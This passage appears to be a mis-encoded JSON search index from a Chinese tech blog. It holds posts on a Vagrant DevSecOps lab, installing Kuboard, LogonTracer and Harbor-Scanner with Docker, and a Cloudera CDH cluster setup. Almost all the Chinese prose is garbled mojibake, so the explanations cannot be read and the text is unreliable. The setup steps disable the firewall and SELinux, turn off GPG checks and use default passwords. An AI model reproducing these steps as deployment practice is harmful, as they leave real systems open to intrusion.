\n\n\n\n&lt;ç±»å‹&gt;\n&lt;ç»„ä»¶å·¥å…·&gt;\n\n\n\næ¸—é€æµ‹è¯•\nNmap, Metasploit\n\n\né™æ€æ£€æµ‹\nBrakeman, bandit, findbugs\n\n\nåŠ¨æ€æ£€æµ‹\nZAP proxy, Gaunlt\n\n\nåŸºçº¿åŠ å›º\nDevSec Ansible OS Hardening\n\n\nåˆè§„æ£€æµ‹\nInspec\n\n\næ“ä½œç³»ç»Ÿ\nUbuntu Xenial (16.04)\n\n\nå¼€å‘è¯­è¨€\nJava, Python 3, Ruby&#x2F;Rails\n\n\nå®¹å™¨åŒ–æŠ€æœ¯\nDocker\n\n\næºç ç®¡ç†\nGitlab\n\n\nCIæœåŠ¡\nGitlab CI&#x2F;Jenkins\n\n\né…ç½®ç®¡ç†\nAnsible\n\n\nå®‰å…¨ç›‘æ§\nELK\n\n\nå…¬æœ‰äº‘\nAWS CLI\n\n\nå…¶ä»–å·¥å…·\nGit, Vim, curl, wget\n\n\nå¸¸è§å·¥å…·é“¾é€‰å‹å‚è€ƒ\nDevSecOpså®‰è£…Require   \n\nVagrant       \nVirtualbox       \nAnsibleDependenciesbrew install vagrant\nbrew install virtualbox\nbrew install ansible\nInstallation$ git clone https:&#x2F;&#x2F;github.com&#x2F;hysnsec&#x2F;DevSecOps-Studio.git\n$ cd DevSecOps-Studio &amp;&amp; vagrant status\n$ ansible-galaxy install -r requirements.yml\nvagrant up\nQ&#x2F;AQ1#homebrewå®‰è£…ansibleå¤±è´¥\nexport HOMEBREW_BOTTLE_DOMAIN&#x3D;&#39;&#39; #ä¸´æ—¶ä¿®æ”¹å»æ‰å›½å†…çš„é•œåƒè®¾ç½®: åœ¨ Terminal ä¸­è¾“å…¥ä¸‹é¢çš„å‘½ä»¤å³å¯.\nå†™å…¥zshçš„~&#x2F;.zprofileæ–‡ä»¶sourceåæ°¸ä¹…ç”Ÿæ•ˆ\nQ2#Vagrantä½¿ç”¨å›½å†…é•œåƒå®‰è£…é•œåƒboxå¤±è´¥\nvagrant init centos7 https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;centos-cloud&#x2F;centos&#x2F;7&#x2F;vagrant&#x2F;x86_64&#x2F;images&#x2F;CentOS-7.box #ä½¿ç”¨ä¸­ç§‘å¤§é•œåƒç«™\n\nDevSecOpså¹³å°ä½¿ç”¨å‰å¯¼å·¥å…·ä½¿ç”¨Vagrantå‘½ä»¤\nvagrant init      # åˆå§‹åŒ–\nvagrant up        # å¯åŠ¨è™šæ‹Ÿæœº\nvagrant halt      # å…³é—­è™šæ‹Ÿæœº\nvagrant reload    # é‡å¯è™šæ‹Ÿæœº\nvagrant ssh       # SSH è‡³è™šæ‹Ÿæœº\nvagrant suspend   # æŒ‚èµ·è™šæ‹Ÿæœº\nvagrant resume    # å”¤é†’è™šæ‹Ÿæœº\nvagrant status    # æŸ¥çœ‹è™šæ‹Ÿæœºè¿è¡ŒçŠ¶æ€\nvagrant destroy   # é”€æ¯å½“å‰è™šæ‹Ÿæœº\nvagrant provision #ä»»åŠ¡æ˜¯é¢„å…ˆè®¾ç½®çš„ä¸€äº›æ“ä½œæŒ‡ä»¤ &#96;vagrant provision --provision-with shell&#96;\n[[box]]ç®¡ç†å‘½ä»¤\nvagrant box list    # æŸ¥çœ‹æœ¬åœ°boxåˆ—è¡¨\nvagrant box add     # æ·»åŠ boxåˆ°åˆ—è¡¨\nvagrant box remove  # ä»boxåˆ—è¡¨ç§»é™¤ \nè®¾ç½®CI&#x2F;CDpipeline\n- 1.åˆ›å»ºé¡¹ç›®ï¼šRepo by URL æˆ–è€…æœ¬åœ°ä½¿ç”¨git push\n- 2.é¡¹ç›®åœ°å€ï¼šhttps:&#x2F;&#x2F;github.com&#x2F;secfigo&#x2F;django.nV.git\n- 3.setup CI&#x2F;CD\nstages:\n  - build\n  - test\n  - deploy\n\nbuild:\n  stage: build\n  script:\n    - echo &quot;This is a build step&quot;\n\ntest:\n  stage: test\n  script:\n    - echo &quot;This is a test step&quot;\n\ndeploy:\n  stage: deploy\n  script:\n    - echo &quot;This is a deploy step&quot;\n\n","slug":"é€šè¿‡è‡ªå»ºDevSecOpsç¯å¢ƒå­¦ä¹ ","date":"2021-08-20T06:20:21.000Z","categories_index":"DevSecOps","tags_index":"CI/CD,Jenkins,DevSecOps,å®éªŒç¯å¢ƒ,Vagrant","author_index":"Moses"},{"id":"f443264b00bffe4f0b17c0513a02db89","title":"Kuberneteså­¦ä¹ ç¬”è®° -- kubeadm-haå®‰è£…é›†ç¾¤","content":"åœ¨K8S ä¸­å®‰è£… Kuboard v3æ–¹æ³•ä¸€ï¼šä½¿ç”¨ hostPath æä¾›æŒä¹…åŒ–å®‰è£…1.æ‰§è¡Œ Kuboard v3 åœ¨ K8S ä¸­çš„å®‰è£…\nkubectl apply -f https:&#x2F;&#x2F;addons.kuboard.cn&#x2F;kuboard&#x2F;kuboard-v3.yaml\n# æ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„æŒ‡ä»¤ï¼Œå”¯ä¸€çš„åŒºåˆ«æ˜¯ï¼Œè¯¥æŒ‡ä»¤ä½¿ç”¨åä¸ºäº‘çš„é•œåƒä»“åº“æ›¿ä»£ docker hub åˆ†å‘ Kuboard æ‰€éœ€è¦çš„é•œåƒ\n# kubectl apply -f https:&#x2F;&#x2F;addons.kuboard.cn&#x2F;kuboard&#x2F;kuboard-v3-swr.yaml\n2.ç­‰å¾… Kuboard v3 å°±ç»ª\n[root@node1 ~]# kubectl get pods -n kuboard\nNAME                               READY   STATUS    RESTARTS   AGE\nkuboard-agent-2-65bc84c86c-r7tc4   1&#x2F;1     Running   2          28s\nkuboard-agent-78d594567-cgfp4      1&#x2F;1     Running   2          28s\nkuboard-etcd-fh9rp                 1&#x2F;1     Running   0          67s\nkuboard-etcd-nrtkr                 1&#x2F;1     Running   0          67s\nkuboard-etcd-ader3                 1&#x2F;1     Running   0          67s\nkuboard-v3-645bdffbf6-sbdxb        1&#x2F;1     Running   0          67s\n3.è®¿é—®Kuboard\n\nåœ¨æµè§ˆå™¨ä¸­æ‰“å¼€é“¾æ¥ http://your-node-ip-address:30080\nè¾“å…¥åˆå§‹ç”¨æˆ·åå’Œå¯†ç ï¼Œå¹¶ç™»å½• admin Kuboard1234.å¸è½½kubectl delete -f https:&#x2F;&#x2F;addons.kuboard.cn&#x2F;kuboard&#x2F;kuboard-v3.yaml\n5.æ¸…ç†é—ç•™æ•°æ®åœ¨ master èŠ‚ç‚¹ä»¥åŠå¸¦æœ‰ k8s.kuboard.cn&#x2F;role&#x3D;etcd æ ‡ç­¾çš„èŠ‚ç‚¹ä¸Šæ‰§è¡Œrm -rf &#x2F;usr&#x2F;share&#x2F;kuboard\n\n","slug":"Kuboard","date":"2021-08-15T16:00:00.000Z","categories_index":"Cloud-Native","tags_index":"Kubernetes,k8s-dashboard,Docker,kuboard","author_index":"Moses"},{"id":"ad55f03212de97d27b0493e8951fccaf","title":"Dockerå®‰è£…LogonTracer","content":"LogonTracerä»‹ç»LogonTracerï¼šæ˜¯ä¸€æ¬¾ç”¨äºå¯è§†åŒ–åˆ†æWindowså®‰å…¨äº‹ä»¶æ—¥å¿—å¯»æ‰¾æ¶æ„ç™»å½•çš„å·¥å…·ã€‚å®ƒä¼šå°†ç™»å½•ç›¸å…³äº‹ä»¶ä¸­æ‰¾åˆ°çš„ä¸»æœºåï¼ˆæˆ–IPåœ°å€ï¼‰å’Œå¸æˆ·åç§°å…³è”èµ·æ¥ï¼Œå¹¶å°†å…¶ä»¥å›¾å½¢åŒ–çš„æ–¹å¼å±•ç°å‡ºæ¥ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œå¯ä»¥çœ‹åˆ°å“ªä¸ªå¸æˆ·ä¸­å‘ç”Ÿè¿‡ç™»å½•å°è¯•ä»¥åŠå“ªä¸ªä¸»æœºè¢«ä½¿ç”¨ã€‚åŸºäºæ­¤ç ”ç©¶ï¼Œè¯¥å·¥å…·å¯ä»¥å¯è§†åŒ–ä¸Windowsç™»å½•ç›¸å…³çš„ä¸‹åˆ—äº‹ä»¶IDã€‚\n4624ï¼šç™»å½•æˆåŠŸ\n \n4625ï¼šç™»å½•å¤±è´¥\n \n4768ï¼šKerberosèº«ä»½éªŒè¯ï¼ˆTGTè¯·æ±‚ï¼‰\n \n4769ï¼šKerberosæœåŠ¡ç¥¨æ®ï¼ˆSTè¯·æ±‚ï¼‰\n \n4776ï¼šNTLMèº«ä»½éªŒè¯\n \n4672ï¼šåˆ†é…ç‰¹æ®Šæƒé™\n\n2 äº’åŠ¨(é”®ç›˜å’Œå±å¹•çš„ç™»å½•ç³»ç»Ÿ)\n \n3 ç½‘ç»œ(å³è¿æ¥åˆ°å…±äº«æ–‡ä»¶å¤¹ä»å…¶ä»–åœ°æ–¹åœ¨è¿™å°ç”µè„‘ä¸Šç½‘ç»œ)\n \n4 æ‰¹å¤„ç†(å³è®¡åˆ’ä»»åŠ¡)\n \n5 æœåŠ¡(æœåŠ¡å¯åŠ¨)\n \n7 è§£é”å¯†ç ä¿æŠ¤å±å¹•ä¿æŠ¤ç¨‹åº(å³unnattendedå·¥ä½œç«™)\n \n8 NetworkCleartext(ç™»å½•å‡­æ®å‘é€æ˜æ–‡ã€‚é€šå¸¸è¡¨ç¤ºä¸â€œåŸºæœ¬èº«ä»½éªŒè¯â€ç™»å½•åˆ°IIS)\n \n9 NewCredentialså¦‚RunAsæˆ–æ˜ å°„ç½‘ç»œé©±åŠ¨å™¨æ›¿ä»£å‡­è¯ã€‚è¿™ä¸ªç™»å½•ç±»å‹ä¼¼ä¹å¹¶æ²¡æœ‰å‡ºç°åœ¨ä»»ä½•äº‹ä»¶ã€‚\n \n10 RemoteInteractive(ç»ˆç«¯æœåŠ¡,è¿œç¨‹æ¡Œé¢æˆ–è¿œç¨‹ååŠ©)\n \n11 CachedInteractive(ä¸ç¼“å­˜åŸŸç™»å½•å‡­è¯æ—¶ç™»å½•ä¸€å°ç¬”è®°æœ¬ç”µè„‘ç­‰è¿œç¦»ç½‘ç»œ)\nä½œç”¨LogonTracerä½¿ç”¨ PageRankå’ŒChangeFinderä»äº‹ä»¶æ—¥å¿—ä¸­æ£€æµ‹æ¶æ„ä¸»æœºå’Œå¸æˆ·ã€‚ä½¿ç”¨LogonTracerï¼Œä¹Ÿå¯ä»¥æŒ‰æ—¶é—´é¡ºåºæ˜¾ç¤ºäº‹ä»¶æ—¥å¿—ã€‚\næ­å»º1.æ‹‰å–é•œåƒæ–‡ä»¶\ndocker pull jpcertcc&#x2F;docker-logontracer\n2.è¿è¡Œé•œåƒ\ndocker run --detach --publish&#x3D;7474:7474 --publish&#x3D;7687:7687 --publish&#x3D;8080:8080 -e LTHOSTNAME&#x3D;172.17.190.98 jpcertcc&#x2F;docker-logontracer\n3.ä¿®æ”¹é¡¹ç›®å‰ç«¯é—®é¢˜\n#1.ç¼–è¾‘é•œåƒæ¨¡æ¿æ–‡ä»¶\ndocker exec -it 349d &#x2F;bin&#x2F;sh\n&#x2F;var&#x2F;lib&#x2F;neo4j# vi &#x2F;usr&#x2F;local&#x2F;src&#x2F;LogonTracer&#x2F;templates&#x2F;index.html\n#2.æ›¿æ¢å›½å†…JSæºæ–‡ä»¶\nhttps:&#x2F;&#x2F;ajax.googleapis.com&#x2F;ajax&#x2F;libs&#x2F;jquery&#x2F;3.2.1&#x2F;jquery.min.js -&gt; æ›¿æ¢æˆhttps:&#x2F;&#x2F;ajax.loli.net&#x2F;ajax&#x2F;libs&#x2F;jquery&#x2F;3.2.1&#x2F;jquery.min.js\n#3.è‹¥è¿˜æœ‰JSèµ„æºé—®é¢˜å¦‚cdnjs.cloudflare.comç­‰å¯ä½¿ç”¨çŒ«äº‘æœç´¢å¯¹åº”JSå¹¶æ›¿æ¢ã€‚\n#4.é‡å¯å®¹å™¨\ndocker restart id [[å®¹å™¨ID]]\n4.æœ¬åœ°é€šè¿‡Pythonè„šæœ¬å¯¼å…¥æ–‡ä»¶\ndocker cp &#x2F;home&#x2F;issue_38.evtx c0384389919d:&#x2F;usr&#x2F;local&#x2F;src&#x2F;LogonTracer #æ‹·è´æ–‡ä»¶åˆ°å®¹å™¨å†…\ncd &#x2F;usr&#x2F;local&#x2F;src&#x2F;LogonTracer &amp;&amp; python3 logontracer.py --delete -e log.evtx -u neo4j -p password #æœ¬åœ°å¯¼å…¥æ–‡ä»¶\n5.Neo4Jæ•°æ®åº“\nhttp:&#x2F;&#x2F;localhost:7474 #åœ°å€\nè´¦å·ï¼šneo4j\nå¯†ç ï¼špassword\n6.dockeræ“ä½œ\n1ï¼‰commitçš„é”™è¯¯æ“ä½œ\ndocker commit c0384389919d jpcertcc&#x2F;docker-logontracer-v2 [[commit]]\ndocker commit åæ— æ³•åˆ é™¤åŸæœ‰é•œåƒæ–‡ä»¶ï¼ŒæŸ¥çœ‹imageçš„çˆ¶imageså‘½ä»¤ï¼š\ndocker image inspect --format&#x3D;&#39;&#123;&#123;.RepoTags&#125;&#125; &#123;&#123;.Id&#125;&#125; &#123;&#123;.Parent&#125;&#125;&#39; $(docker image ls -q --filter since&#x3D;å­é•œåƒid)\n2ï¼‰é•œåƒä¿å­˜åå¯¼å‡ºå¯¼å…¥\ndocker save jpcertcc&#x2F;docker-logontracer&#x2F;root&#x2F;home&#x2F;jpcertcc.tar\ndocker load&lt;jpcertcc.tar\n3)å®¹å™¨å†…å®‰è£…å·¥å…·\napt-get install -y net-tools #ç½‘ç»œå·¥å…·\napt-get install -y vim #ç¼–è¾‘å·¥å…·\napt-get update &amp;&amp; apt-get install procps #è¿›ç¨‹ç®¡ç†å·¥å…·\n4)æ‰‹åŠ¨å¯åŠ¨web\npython3 logontracer.py -r -o 8080 -u neo4j -p password -s localhost\nèµ„æºé“¾æ¥çŒ«äº‘githubåœ°å€neo4jæ–‡æ¡£   \n","slug":"Dockerå®‰è£…LogonTracer","date":"2021-07-28T09:13:17.000Z","categories_index":"åº”æ€¥å“åº”","tags_index":"æ—¥å¿—åˆ†æ,åº”æ€¥å“åº”","author_index":"Moses"},{"id":"4a5feac766d456074a0922c23a83b4df","title":"å®¹å™¨å®‰å…¨å¹³å°-Habor-Scanner","content":"Harbor-Scannerä¸€ä¸ªå…è´¹çš„é•œåƒæ¼æ´æ‰«æå·¥å…·, å¯ä»¥æ‰«æé•œåƒä¸­å·²å®‰è£…è½¯ä»¶åŒ…çš„æ¼æ´ï¼Œæ”¯æŒä¸­æ–‡æ¼æ´åº“ï¼Œå¯ä¸ Harbor æ— ç¼é›†æˆã€‚\n\n\n\n\n\n\n\n\n\nDosec çš„å•†ä¸šå®¢æˆ·å¯ä»¥ä½¿ç”¨ä¼ä¸šç‰ˆæ‰«æåŠŸèƒ½ï¼Œä¾‹å¦‚æ‰«æå¼€æºæ¡†æ¶ä¸­çš„æ¼æ´ä»¥åŠæ‰«æå®¹å™¨é•œåƒä¸­åŒ…å«çš„æ•æ„Ÿæ•°æ®ã€‚åŒæ—¶ä¼ä¸šç‰ˆå¢åŠ äº†WEB UI, æä¾›ä»ªè¡¨æ¿ï¼Œèµ„äº§ç®¡ç†ï¼Œç”¨æˆ·ç®¡ç†ï¼Œé•œåƒæ¼æ´ä¿®å¤å»ºè®®, å®‰å…¨å’Œç­–ç•¥è¯„ä¼°æŠ¥å‘Šï¼Œå®¹å™¨è¿è¡Œæ—¶é˜²æŠ¤ï¼ŒDocker å’Œ Kubernetes åˆè§„æ£€æŸ¥ä»¥åŠå…¶ä»–åŠŸèƒ½å’Œæ¨¡å—ã€‚\nç‰¹ç‚¹\næ¼æ´æ‰«æå¿«é€Ÿå‡†ç¡®ï¼Œæ”¯æŒCVEå’ŒCNNVDåŒæ¼æ´ç¼–å·ï¼Œæ¼æ´ä¸­æ–‡æè¿°ä¿¡æ¯\nè‡ªåŠ¨æ›´æ–°æ¼æ´åº“(åœ¨é…ç½®ä¸­å¼€å¯è‡ªåŠ¨æ›´æ–°å‚æ•°)\nå¿«é€Ÿéƒ¨ç½²ä½¿ç”¨ï¼Œæœ€æ–°çš„å‘å¸ƒç‰ˆä¸­å·²åŒ…å«æœ€è¿‘æ—¥æœŸä¹‹å‰çš„å…¨é‡æ¼æ´åº“ï¼Œå®‰è£…å®Œæˆå³å¯ç«‹å³æ‰«æå‡ºç»“æœ\n\nå®‰è£…æ¨èå°† Harbor-Scanner å’Œ Harbor é•œåƒä»“åº“éƒ¨ç½²åœ¨åŒä¸€å°æœåŠ¡å™¨ã€‚\n\nä¸‹è½½ Harbor-Scanner çš„ç¦»çº¿å®‰è£…åŒ…å¹¶è§£å‹\n wget https:&#x2F;&#x2F;github.com&#x2F;dosec-cn&#x2F;harbor-scanner&#x2F;releases&#x2F;download&#x2F;v1.2&#x2F;dosec-scanner.tgz\n# è§£å‹\ntar zxf dosec-scanner.tgz\n# è¿›å…¥é¡¹ç›®\ncd dosec-scanner\n\nè¿è¡Œ Install è„šæœ¬\n\n\n\n\n\n\n\n\n\néœ€è¦æå‰å®‰è£… docker-compose\n .&#x2F;Install.sh\n\né…ç½® Harbor ä»“åº“\n ç™»å½• Harbor ç®¡ç†ç•Œé¢ -&gt; å®¡æŸ¥æœåŠ¡ -&gt; æ‰«æå™¨ -&gt; æ–°å»ºæ‰«æå™¨\n \n å¡«å†™æ‰«æå™¨é…ç½® -&gt; ç‚¹å‡» ADD ç¡®è®¤æ·»åŠ \n \n â‘  å¡«å†™æ‰«æå·¥å…·çš„åç§°\n â‘¡ å¡«å†™æ‰«æå·¥å…·çš„ IP å’Œç«¯å£\n â‘¢ æµ‹è¯• Harbor å’Œæ‰«æå·¥å…·æ˜¯å¦èƒ½æ­£å¸¸è¿æ¥\n â‘£ åªæœ‰æµ‹è¯•è¿æ¥æˆåŠŸåæ‰èƒ½æ·»åŠ \n\n\nè‡ªå®šä¹‰é…ç½®å¯æ ¹æ®éœ€è¦æ›´æ”¹ docker-compose.yaml æ–‡ä»¶\nversion: &#39;2.2&#39;\n\nservices:\n  dosec-db-hb:\n    image: hub.dosec.cn&#x2F;library&#x2F;dosec-db-hb:2021-04-06T14.21.24\n    restart: always\n\n  dosec-scannerapp:\n    depends_on:\n      - dosec-db-hb\n    image: hub.dosec.cn&#x2F;library&#x2F;dosec-scannerapp:2021-04-02T19.42.13V1.0.0_prod\n    # é»˜è®¤æ˜ å°„äº†ä¸»æœºçš„ 8899 ç«¯å£\n    ports:\n      - &quot;8899:8899&quot;\n    restart: always\n    # é»˜è®¤å°†ç¨‹åºæ—¥å¿—æ˜ å°„åˆ°äº†ä¸»æœºçš„ &#x2F;var&#x2F;log&#x2F;dosec-scanner ç›®å½•\n    volumes:\n      - &#x2F;var&#x2F;log&#x2F;dosec-scanner:&#x2F;dosec&#x2F;log\n\n  dosec-scanner-hb:\n    depends_on:\n      - dosec-db-hb\n      - dosec-scannerapp\n    image: hub.dosec.cn&#x2F;library&#x2F;dosec-scanner-hb:2021-04-02T17.07.22V1.2_release\n    # command: [&quot;-update_cve&quot;]\n    # é»˜è®¤æ³¨é‡Šäº†åœ¨çº¿æ›´æ–° CVE åŠŸèƒ½, ä¼šæ¶ˆè€—å¤§é‡ CPU å’Œå†…å­˜\n    restart: always\n    # é»˜è®¤å°†ç¨‹åºæ—¥å¿—æ˜ å°„åˆ°äº†ä¸»æœºçš„ &#x2F;var&#x2F;log&#x2F;dosec-scanner ç›®å½•\n    volumes:\n      - &#x2F;var&#x2F;log&#x2F;dosec-scanner:&#x2F;dosec&#x2F;log\n\nå¸è½½è¿›å…¥ Harbor-Scanner é¡¹ç›®ç›®å½•, æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å³å¯å®Œå…¨å¸è½½\ndocker-compose down\n\næ”¯æŒæ‰«æçš„æ“ä½œç³»ç»Ÿ\nDebian &gt;&#x3D; 7, unstable\nUbuntu LTS releases &gt;&#x3D; 12.04\nRed Hat Enterprise Linux &gt;&#x3D; 5\nCentOS &gt;&#x3D; 5\nAlpine &gt;&#x3D; 3.3\nOracle Linux &gt;&#x3D; 5\n\nDosec å®‰å…¨äº§å“å¯¹æ¯”\n\n\nåŠŸèƒ½\nHarbor-Scanner\né•œç•Œå®¹å™¨å®‰å…¨é˜²æŠ¤å¹³å°\n\n\n\nè®¸å¯\nå…è´¹\nä¼ä¸šç‰ˆ\n\n\næ”¯æŒä¸ Harbor é›†æˆ\n:heavy_check_mark:\n:heavy_check_mark:\n\n\nç³»ç»Ÿè½¯ä»¶åŒ…æ¼æ´æ‰«æ\n:heavy_check_mark:\n:heavy_check_mark:\n\n\nå¼€æºç»„ä»¶æ¼æ´æ‰«æ\n\n:heavy_check_mark:\n\n\næ¶æ„è½¯ä»¶æ‰«æ\n\n:heavy_check_mark:\n\n\næ•æ„Ÿæ•°æ®æ‰«æ\n\n:heavy_check_mark:\n\n\né•œåƒé…ç½®æ£€æŸ¥\n\n:heavy_check_mark:\n\n\né•œåƒå†å²è¡Œä¸ºåˆ†æ\n\n:heavy_check_mark:\n\n\né˜»æ­¢éä¿¡ä»»é•œåƒè¿è¡Œ\n\n:heavy_check_mark:\n\n\nè¿è¡Œæ—¶ä¿æŠ¤\n\n:heavy_check_mark:\n\n\nåˆè§„æ£€æŸ¥\n\n:heavy_check_mark:\n\n\n","slug":"å®¹å™¨é•œåƒå®‰å…¨-Habor-scanner","date":"2021-04-05T18:16:02.000Z","categories_index":"Cloud-Native-Security","tags_index":"é•œåƒå®‰å…¨,äº‘åŸç”Ÿå®‰å…¨,å®¹å™¨å®‰å…¨å¹³å°,äº§å“é€‰å‹,harbor","author_index":"Moses"},{"id":"1a2332bedd5393f913279007dced6f6f","title":"CDHæ„å»ºå¤§æ•°æ®å¹³å°-ä½¿ç”¨è‡ªå»ºçš„é•œåƒåœ°å€å®‰è£…Cloudera Manager","content":"CDHæ„å»ºå¤§æ•°æ®å¹³å°-ä½¿ç”¨è‡ªå»ºçš„é•œåƒåœ°å€å®‰è£…Cloudera Manager\nä¸€ã€ç®€ä»‹ç›®å‰Hadoopå‘è¡Œç‰ˆéå¸¸å¤šï¼Œæœ‰åä¸ºå‘è¡Œç‰ˆã€Intelå‘è¡Œç‰ˆã€Clouderaå‘è¡Œç‰ˆ(CDH)ã€Hortonworksç‰ˆæœ¬ï¼ˆHDPï¼‰ç­‰ï¼Œæ‰€æœ‰è¿™äº›å‘è¡Œç‰ˆå‡æ˜¯åŸºäºApache Hadoopè¡ç”Ÿå‡ºæ¥çš„ï¼Œä¹‹æ‰€ä»¥æœ‰è¿™ä¹ˆå¤šçš„ç‰ˆæœ¬ï¼Œå®Œå…¨æ˜¯ç”±Apache Hadoopçš„å¼€æºåè®®å†³å®šçš„ï¼šä»»ä½•äººå¯ä»¥å¯¹å…¶è¿›è¡Œä¿®æ”¹ï¼Œå¹¶ä½œä¸ºå¼€æºæˆ–å•†ä¸šäº§å“å‘å¸ƒ&#x2F;é”€å”®ã€‚CDH (Clouderaâ€™s Distribution, including Apache Hadoop)ï¼Œæ˜¯Hadoopä¼—å¤šåˆ†æ”¯ä¸­çš„ä¸€ç§ï¼Œç”±Clouderaç»´æŠ¤ï¼ŒåŸºäºç¨³å®šç‰ˆæœ¬çš„Apache Hadoopæ„å»ºï¼Œå¹¶é›†æˆäº†å¾ˆå¤šè¡¥ä¸ï¼Œå¯ç›´æ¥ç”¨äºç”Ÿäº§ç¯å¢ƒã€‚   \n\n\n\n\n\n\n\n\n\nä»2021å¹´1æœˆ31æ—¥å¼€å§‹ï¼Œæ‰€æœ‰Clouderaè½¯ä»¶éƒ½éœ€è¦æœ‰æ•ˆçš„è®¢é˜…ï¼Œå¹¶ä¸”åªèƒ½é€šè¿‡ä»˜è´¹å¢™è¿›è¡Œè®¿é—®ã€‚å³ç›®å‰Apacheç¤¾åŒºç‰ˆæœ¬å¤–å‡é‡‡ç”¨å•†ä¸šä»˜è´¹æ¨¡å¼ã€‚ä½†ç¤¾åŒºç‰ˆåœ¨ç‰ˆæœ¬ç®¡ç†ã€éƒ¨ç½²è¿ç»´ã€ç”Ÿæ€å³å®‰å…¨æ–¹é¢è¿˜æœ‰å¾ˆå¤šä¸è¶³ä¹‹å¤„ï¼Œæ•…æœ¬æ–‡æ„åœ¨é€šè¿‡è‡ªå»ºé•œåƒæ–¹å¼éƒ¨ç½²CDHç‰ˆæœ¬Hadoop\n1.ç¯å¢ƒå‡†å¤‡1.1ä¸»æœºèµ„æºå‡†å¤‡æµ‹è¯•ç¯å¢ƒé‡‡ç”¨Macæœ¬åœ°éƒ¨ç½²è™šæ‹Ÿæœºæ–¹å¼å®‰è£…3å°centos7åŸºç¡€webæœåŠ¡å™¨ã€‚ \næœ€å°é…ç½®ä¸ºï¼š \n- Hadoop01ï¼ˆCM-server|Agentï¼‰å†…å­˜æœ€å°4Gæ¨è12-16Gï¼›\n- Hadoop02ï¼ˆAgentï¼‰å†…å­˜æœ€å°4Gæ¨è8-16Gï¼›  \n- Hadoop03ï¼ˆAgentï¼‰å†…å­˜æœ€å°4Gæ¨è8-16Gï¼›\n1.2ç³»ç»Ÿç¯å¢ƒå‡†å¤‡\nç½‘ç»œé…ç½®ï¼šæ‰€æœ‰èŠ‚ç‚¹ä½¿ç”¨é™æ€IP\nä¸»æœºåï¼šä¿®æ”¹æ‰€æœ‰èŠ‚ç‚¹ä¸»æœºåå¹¶åŠ å…¥åˆ°hostsæ–‡ä»¶\né˜²ç«å¢™å…³é—­ï¼šsystemctl stop firewalld &amp;&amp; systemctl disable firewalld \nselinuxå…³é—­ï¼šsed -i â€˜s&#x2F;^SELINUX&#x3D;.&#x2F;SELINUX&#x3D;disabled&#x2F;â€˜ &#x2F;etc&#x2F;selinux&#x2F;config &amp;&amp; setenforce 0 \nNTPæ—¶é—´åŒæ­¥ï¼šè™šæ‹Ÿæœºå¯é€‰æ‹©ç›¸åŒæ—¶åŒºå³å¯ï¼Œç”Ÿäº§ç¯å¢ƒé…ç½®å±€åŒºåŸŸå†…NTP    \nSSHå…å¯†ç™»å½•ï¼šæ‰€æœ‰èŠ‚ç‚¹åˆ†åˆ«æ‰§è¡Œssh-keygen -t rsaã€ssh-copy-id -i &#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub root@hadoop[01-03]\nè®¾ç½®æ–‡ä»¶æ‰“å¼€æ•°æ®å’Œç”¨æˆ·æœ€å¤§è¿›ç¨‹æ•°ï¼šé€šè¿‡ä¿®æ”¹limits.confè¿›è¡Œä¼˜åŒ–\n\n1.3å®‰è£…åŒ…ä¸ä¾èµ–æ‰€æœ‰èŠ‚ç‚¹å®‰è£…ï¼šyum -y install chkconfig python bind-utils psmisc libxslt zlib sqlite cyrus-sasl-plain cyrus-sasl-gssapi fuse fuse-libs redhat-lsb postgresql portmap mod_ssl openssl-devel python-psycopg2 MySQL-python\n2.æ­å»ºç§ä»“cm-serveræˆ–è€…ä»»æ„ä¸€å°åŒå±€åŸŸç½‘åŒç½‘æ®µå†…æœåŠ¡å®‰è£…webæœåŠ¡å¹¶å¯åŠ¨ï¼Œyum -y install httpd &amp;&amp; systemctl start httpd;ä¸‹è½½å¯¹åº”çš„CMèµ„æºåˆ°webç›®å½•ï¼Œä¸‹è½½åœ°å€ï¼šhttp://ro-bucharest-repo.bigstepcloud.com/cloudera-repos/åˆ›å»ºrepodataæ•°æ®æ–‡ä»¶ï¼Œyum -y install createrepo &amp;&amp; cd /var/www/html/cm-6.2.0/ &amp;&amp; createrepo .åˆ›å»ºæœ¬åœ°yumæ–‡ä»¶cloudra-manager.repoï¼Œå¹¶å°†æ–‡ä»¶æ”¾ç½®åœ¨ç§ä»“webç›®å½•ã€‚\n# Packages for Cloudera Manager, Version 5, on RedHat or CentOS 7 x86_64                  \nname&#x3D;Cloudera Manager\nbaseurl&#x3D;http:&#x2F;&#x2F;172.16.3.109&#x2F;cm-6.2.0&#x2F;\ngpgkey &#x3D;http:&#x2F;&#x2F;172.16.3.109&#x2F;cm-6.2.0&#x2F;RPM-GPG-KEY-cloudera    \nenabled &#x3D; 1\ngpgcheck &#x3D; 0\né…ç½®é›†ç¾¤æœ¬åœ°yumæºï¼Œmkdir /etc/yum.repos.d/repo-backup &amp;&amp; mv /etc/yum.repos.d/*.rpo repo-backup\néƒ¨ç½²CM-server1&gt;å®‰è£…MySQLæ•°æ®åº“ï¼Œæµ‹è¯•å•å°5.6æ­£å¼å¯ä½¿ç”¨ä¸»ä»5.7MySQL5.6.51å®‰è£…æŒ‡å¯¼è¯¦è§https://blog.csdn.net/yy8623977/article/details/1180903712&gt;é…ç½®å…ƒæ•°æ®åº“è¯¦è§https://www.cnblogs.com/yinzhengjie/articles/10384065.html3&gt;é…ç½®CM\nsed -i s&#39;[[Xmx2G]][[Xmx4G]]#&#39; &#x2F;etc&#x2F;default&#x2F;cloudera-scm-server &amp;&amp; grep CMF_JAVA_OPTS &#x2F;etc&#x2F;default&#x2F;cloudera-scm-server \nexport CMF_JAVA_OPTS&#x3D;&quot;-Xmx4G -XX:MaxPermSize&#x3D;256m -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath&#x3D;&#x2F;tmp&quot; \n4&gt;åˆå§‹åŒ–æ•°æ®åº“,/opt/cloudera/cm/schema/scm_prepare_database.sh mysql scm scm moses &amp;&amp; systemctl start cloudera-scm-server\néƒ¨ç½²CM-AgentèŠ‚ç‚¹å®‰è£…ä¾èµ–åŒ…ï¼Œæ›´æ¢æœ¬åœ°yumæºå®‰è£…CM-Agentï¼Œé…ç½®config.iniæ–‡ä»¶çš„CMåœ°å€ã€‚\nHDFSæœåŠ¡å®‰è£…æ—¶æŠ¥é”™ï¼šsu - hdfs &amp;&amp; hdfs 